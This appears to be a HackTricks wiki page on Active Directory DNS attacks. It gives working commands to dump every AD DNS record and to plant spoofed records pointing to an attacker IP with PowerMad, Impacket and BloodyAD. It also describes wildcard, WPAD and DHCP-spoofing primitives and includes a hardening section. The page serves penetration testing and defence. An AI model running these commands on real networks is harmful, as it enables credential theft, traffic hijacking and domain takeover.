# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

By default **any user** in Active Directory can **enumerate all DNS records** in the Domain or Forest DNS zones, similar to a zone transfer (users can list the child objects of a DNS zone in an AD environment).

The tool [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) enables **enumeration** and **exporting** of **all DNS records** in the zone for recon purposes of internal networks.

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (April 2025) adds JSON/Greppable (`--json`) output, multi-threaded DNS resolution and support for TLS 1.2/1.3 when binding to LDAPS  

For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Creating / Modifying records (ADIDNS spoofing)

Because the **Authenticated Users** group has **Create Child** on the zone DACL by default, any domain account (or computer account) can register additional records.  This can be used for traffic hijacking, NTLM relay coercion or even full domain compromise.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py ships with Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Common attack primitives

1. **Wildcard record** – `*.<zone>` turns the AD DNS server into an enterprise-wide responder similar to LLMNR/NBNS spoofing. It can be abused to capture NTLM hashes or to relay them to LDAP/SMB.  (Requires WINS-lookup to be disabled.)    
2. **WPAD hijack** – add `wpad` (or an **NS** record pointing to an attacker host to bypass the Global-Query-Block-List) and transparently proxy outbound HTTP requests to harvest credentials.  Microsoft patched the wildcard/ DNAME bypasses (CVE-2018-8320) but **NS-records still work**.    
3. **Stale entry takeover** – claim the IP address that previously belonged to a workstation and the associated DNS entry will still resolve, enabling resource-based constrained delegation or Shadow-Credentials attacks without touching DNS at all.    
4. **DHCP → DNS spoofing** – on a default Windows DHCP+DNS deployment an unauthenticated attacker on the same subnet can overwrite any existing A record (including Domain Controllers) by sending forged DHCP requests that trigger dynamic DNS updates (Akamai “DDSpoof”, 2023).  This gives machine-in-the-middle over Kerberos/LDAP and can lead to full domain takeover.    
5. **Certifried (CVE-2022-26923)** – change the `dNSHostName` of a machine account you control, register a matching A record, then request a certificate for that name to impersonate the DC. Tools such as **Certipy** or **BloodyAD** fully automate the flow.  

---

## Detection & hardening

* Deny **Authenticated Users** the *Create all child objects* right on sensitive zones and delegate dynamic updates to a dedicated account used by DHCP.
* If dynamic updates are required, set the zone to **Secure-only** and enable **Name Protection** in DHCP so that only the owner computer object can overwrite its own record.
* Monitor DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) and LDAP writes to `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Block dangerous names (`wpad`, `isatap`, `*`) with an intentionally-benign record or via the Global Query Block List.
* Keep DNS servers patched – e.g., RCE bugs CVE-2024-26224 and CVE-2024-26231 reached **CVSS 9.8** and are remotely exploitable against Domain Controllers.  



## References

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, still the de-facto reference for wildcard/WPAD attacks)  
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
{{#include ../../banners/hacktricks-training.md}}
